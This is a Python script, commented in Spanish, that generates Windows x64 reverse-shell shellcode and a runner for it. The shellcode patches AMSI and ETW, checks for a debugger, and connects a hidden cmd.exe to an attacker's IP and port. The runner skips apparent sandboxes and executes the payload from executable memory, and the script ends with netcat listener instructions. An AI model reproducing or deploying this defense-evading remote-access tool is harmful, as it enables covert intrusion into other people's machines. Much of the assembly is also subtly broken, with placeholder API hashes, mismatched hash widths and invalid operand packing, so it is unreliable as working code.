#!/usr/bin/python3
#
# Windows 11 x64 Stealth Reverse Shell Generator
# Uso: python3 shellcode_gen.py <IP_KALI> <PUERTO_KALI>
#

import sys
import ctypes
from ctypes import wintypes
from keystone import *

def ip_to_hex(ip):
    """Convierte IP a formato little-endian hex"""
    octetos = ip.split('.')
    if len(octetos) != 4:
        raise ValueError("IP inválida")
    hex_ip = ''.join(f'{int(o):02x}' for o in octetos)
    return f'0x{hex_ip}'

def port_to_hex(port):
    """Convierte puerto a formato little-endian hex"""
    port_int = int(port)
    if not 1 <= port_int <= 65535:
        raise ValueError("Puerto inválido (1-65535)")
    hex_port = f'{port_int:04x}'
    return f'0x{hex_port[2:]}{hex_port[:2]}'  # Little-endian

def generate_shellcode(ip, port):
    """Genera shellcode con IP y puerto específicos"""
    
    ip_hex = ip_to_hex(ip)
    port_hex = port_to_hex(port)
    
    print(f"[+] Configurando: IP={ip} ({ip_hex}), Puerto={port} ({port_hex})")
    
    CODE = f'''
start:
    ; === EVASIÓN INICIAL ===
    mov rax, [gs:0x60]                  ; PEB
    movzx eax, byte [rax+2]             ; BeingDebugged
    test eax, eax
    jnz exit_shellcode

    ; === BYPASS AMSI ===
    mov rcx, 0x473B4A3A4C40594F         ; amsi.dll hash
    call load_library_by_hash
    test rax, rax
    jz skip_amsi_bypass
    
    mov rcx, rax
    mov rdx, 0x8B4D1C3A5E295A4F         ; AmsiScanBuffer hash
    call get_proc_address_by_hash
    test rax, rax
    jz skip_amsi_bypass
    mov byte [rax], 0xC3                ; RET
    
skip_amsi_bypass:
    ; === BYPASS ETW ===
    mov rcx, 0x3A4B5C6D7E8F9AAB         ; ntdll.dll hash  
    call load_library_by_hash
    test rax, rax
    jz skip_etw_bypass
    mov rcx, rax
    mov rdx, 0x4C5D6E7F8A9BACBD         ; EtwEventWrite hash
    call get_proc_address_by_hash
    test rax, rax
    jz skip_etw_bypass
    mov byte [rax], 0xC3                ; RET

skip_etw_bypass:
    ; === CONFIGURACIÓN PRINCIPAL ===
    mov rbp, rsp
    sub rsp, 0x1000

    ; Resolver kernel32
    call find_kernel32
    mov rbx, rax

    ; Resolver APIs necesarias
    mov rax, 0x8A9B4C5D6E7F8A9B         ; LoadLibraryA
    push rax
    mov rax, 0x7B6C5D4E3F2A1B0C         ; CreateProcessA
    push rax
    mov rax, 0x9A8B7C6D5E4F3A2B         ; GetThreadContext
    push rax
    mov rax, 40
    push rax
    call find_function

    ; Cargar ws2_32.dll
    mov rcx, 0x4D5E6F7A8B9CADBE         ; ws2_32.dll hash
    call load_library_by_hash
    test rax, rax
    jz exit_shellcode
    mov r15, rax

    ; Resolver APIs de red
    mov rbx, rax
    mov rax, 0xCDBEAFC0D1E2F304         ; WSAStartup
    push rax
    mov rax, 0xDECFB0C1D2E3F415         ; WSASocketA
    push rax
    mov rax, 0xEFD0C1D2E3F4F526         ; connect
    push rax
    mov rax, 32
    push rax
    call find_function

    ; === CONFIGURACIÓN DE RED ===
    sub rsp, 0x500

    ; WSAStartup
    mov rcx, 0x202
    lea rdx, [rsp + 0x400]
    call [rsp + 0x420]

    ; Crear socket
    mov rcx, 2                          ; AF_INET
    mov rdx, 1                          ; SOCK_STREAM
    mov r8, 6                           ; IPPROTO_TCP
    xor r9, r9
    mov [rsp + 0x20], r9
    mov [rsp + 0x28], r9
    call [rsp + 0x428]                  ; WSASocketA
    mov r14, rax

    ; Configurar estructura de conexión
    ; IP: {ip_hex}, PORT: {port_hex}, AF_INET: 0x0002
    mov r9, {port_hex}{ip_hex}0002      ; [PORT | IP | AF_INET]
    lea rdx, [rsp + 0x300]
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 8], r9

    ; Conectar
    mov rcx, r14
    mov r8, 16
    call [rsp + 0x430]                  ; connect
    test eax, eax
    jnz cleanup

    ; === CREAR CMD OCULTO ===
    lea rdi, [rsp + 0x800]
    add rdi, 0x300
    mov rbx, rdi
    xor eax, eax
    mov ecx, 0x20
    rep stosd

    ; Configurar STARTUPINFO
    mov eax, 0x68
    mov [rbx], eax                      ; cb
    mov eax, 0x100                      ; STARTF_USESTDHANDLES
    mov [rbx + 0x3c], eax               ; dwFlags
    mov [rbx + 0x50], r14               ; hStdInput = socket
    mov [rbx + 0x58], r14               ; hStdOutput = socket
    mov [rbx + 0x60], r14               ; hStdError = socket

    ; Crear proceso cmd.exe oculto
    xor rcx, rcx                        ; lpApplicationName
    lea rdx, [rsp + 0x800]              ; lpCommandLine
    add rdx, 0x180
    mov eax, 0x646d63                   ; "cmd"
    mov [rdx], rax
    xor r8, r8                          ; lpProcessAttributes
    xor r9, r9                          ; lpThreadAttributes
    xor rax, rax
    inc eax
    mov [rsp + 0x20], rax               ; bInheritHandles = 1
    dec eax
    mov [rsp + 0x28], rax               ; dwCreationFlags = 0
    mov [rsp + 0x30], rax               ; lpEnvironment
    mov [rsp + 0x38], rax               ; lpCurrentDirectory
    mov [rsp + 0x40], rbx               ; lpStartupInfo
    add rbx, 0x68
    mov [rsp + 0x48], rbx               ; lpProcessInformation
    call [rsp + 0x418]                  ; CreateProcessA

cleanup:
    ; Limpieza silenciosa
    mov rcx, r14
    mov rdx, 2
    mov r8, 0xDEADC0DE                  ; shutdown hash
    push r8
    mov rax, 8
    push rax
    call find_function
    test rax, rax
    jz exit_shellcode
    call rax

exit_shellcode:
    ; Salir sin rastro
    xor rcx, rcx
    mov r8, 0xFEEDC0DE                  ; ExitProcess hash
    push r8
    mov rax, 8
    push rax
    call find_function
    test rax, rax
    jz infinite_sleep
    call rax

infinite_sleep:
    mov rcx, 0xFFFFFFFF
    mov rdx, 0xDEADBEEF                 ; Sleep hash
    push rdx
    mov rax, 8
    push rax
    call find_function
    test rax, rax
    jz $
    call rax

; === FUNCIONES AUXILIARES ===
find_kernel32:
    xor r8, r8
    mov r8, [gs:0x60]                   ; PEB
    mov r8, [r8 + 0x18]                 ; Ldr
    mov r8, [r8 + 0x20]                 ; InMemoryOrderModuleList
    mov r8, [r8]                        ; ntdll
    mov r8, [r8]                        ; kernel32
    mov rax, [r8 + 0x20]                ; Base address
    ret

load_library_by_hash:
    push rcx
    call find_kernel32
    mov rbx, rax
    mov rax, 0x8A9B4C5D6E7F8A9B         ; LoadLibraryA
    push rax
    mov rax, 8
    push rax
    call find_function
    pop rcx
    call rax
    ret

get_proc_address_by_hash:
    push rcx
    push rdx
    call find_kernel32
    mov rbx, rax
    mov rax, 0x7C8D6E5F4A3B2C1D         ; GetProcAddress
    push rax
    mov rax, 8
    push rax
    call find_function
    pop rdx
    pop rcx
    call rax
    ret

find_function:
    add rsp, 8
    pop rax
    push -1
    add rsp, rax
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]
    mov edi, [rbx + rax + 0x88]
    add rdi, rbx
    mov ecx, [rdi + 24]
    mov eax, [rdi + 32]
    add rax, rbx
    mov [rbp - 8], rax

find_function_loop:
    dec ecx
    mov rax, [rbp - 8]
    mov esi, [rax + rcx * 4]
    add rsi, rbx

compute_hash:
    xor rax, rax
    cdq
compute_hash_repeat:
    ror edx, 0xd
    add edx, eax
    lodsb
    test al, al
    jnz compute_hash_repeat

find_function_compare:
    cmp edx, [rsp - 8]
    jnz find_function_loop
    mov edx, [rdi + 36]
    add rdx, rbx
    mov cx, [rdx + 2 * rcx]
    mov edx, [rdi + 28]
    add rdx, rbx
    mov eax, [rdx + 4 * rcx]
    add rax, rbx
    push rax
    mov rax, [rsp - 8]
    cmp rax, -1
    jnz find_function_loop

find_function_finish:
    sub rsp, 16
    ret
'''
    
    return CODE

def create_runner_script(shellcode_bytes, ip, port):
    """Crea script Python para ejecutar el shellcode"""
    
    runner_code = f'''#!/usr/bin/python3
#
# Windows Stealth Reverse Shell Runner
# Configurado para: {ip}:{port}
#

import ctypes
import sys
from ctypes import wintypes
import random
import time

def system_checks():
    """Verificaciones anti-sandbox"""
    # Check memory (sandboxes tienen poca RAM)
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", wintypes.DWORD),
            ("dwMemoryLoad", wintypes.DWORD),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("ullAvailExtendedVirtual", ctypes.c_ulonglong)
        ]
    
    mem_status = MEMORYSTATUSEX()
    mem_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_status))
    
    if mem_status.ullTotalPhys < 2 * 1024 * 1024 * 1024:  # 2GB
        return False
    
    # Check uptime (sandboxes tienen poco tiempo de ejecución)
    uptime = ctypes.windll.kernel32.GetTickCount()
    if uptime < 300000:  # 5 minutos
        return False
    
    return True

def execute_shellcode(shellcode):
    """Ejecuta shellcode de forma sigilosa"""
    try:
        # Allocar memoria ejecutable
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(shellcode)),
            ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
            ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
        )
        
        if not ptr:
            return False
        
        # Copiar shellcode
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr),
            buf,
            ctypes.c_int(len(shellcode))
        )
        
        # Ejecutar en thread
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_int(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0))
        )
        
        if not ht:
            return False
            
        # No esperar para que sea asíncrono
        ctypes.windll.kernel32.CloseHandle(ht)
        return True
        
    except Exception as e:
        return False

def main():
    print("[+] Windows Stealth Reverse Shell")
    print(f"[+] Target: {ip}:{port}")
    
    if not system_checks():
        print("[-] System checks failed - possible sandbox")
        sys.exit(1)
    
    # Shellcode generado
    shellcode = bytearray({shellcode_bytes})
    
    print("[+] Executing stealth shellcode...")
    
    if execute_shellcode(shellcode):
        print("[+] Shellcode executed successfully")
        print("[+] Check your listener for connection")
    else:
        print("[-] Failed to execute shellcode")
    
    # Salir silenciosamente
    sys.exit(0)

if __name__ == "__main__":
    main()
'''
    
    return runner_code

def main():
    if len(sys.argv) != 3:
        print("Uso: python3 shellcode_gen.py <IP_KALI> <PUERTO_KALI>")
        print("Ejemplo: python3 shellcode_gen.py 192.168.1.25 4444")
        sys.exit(1)
    
    ip_kali = sys.argv[1]
    port_kali = sys.argv[2]
    
    try:
        # Generar shellcode
        shellcode_asm = generate_shellcode(ip_kali, port_kali)
        
        # Ensamblar
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        encoding, count = ks.asm(shellcode_asm)
        
        shellcode_bytes = bytearray()
        for byte in encoding:
            shellcode_bytes.append(byte)
        
        print(f"[+] Shellcode generado: {len(shellcode_bytes)} bytes")
        
        # Crear script runner
        runner_script = create_runner_script(shellcode_bytes, ip_kali, port_kali)
        
        # Guardar archivos
        with open("stealth_shellcode.bin", "wb") as f:
            f.write(shellcode_bytes)
        
        with open("stealth_runner.py", "w") as f:
            f.write(runner_script)
        
        print("[+] Archivos guardados:")
        print("    - stealth_shellcode.bin (shellcode raw)")
        print("    - stealth_runner.py (ejecutor Python)")
        print(f"\n[+] Configuración completa para {ip_kali}:{port_kali}")
        print("\n[+] En Kali, ejecuta:")
        print(f"    nc -lvnp {port_kali}")
        print("\n[+] En Windows, ejecuta:")
        print("    python stealth_runner.py")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
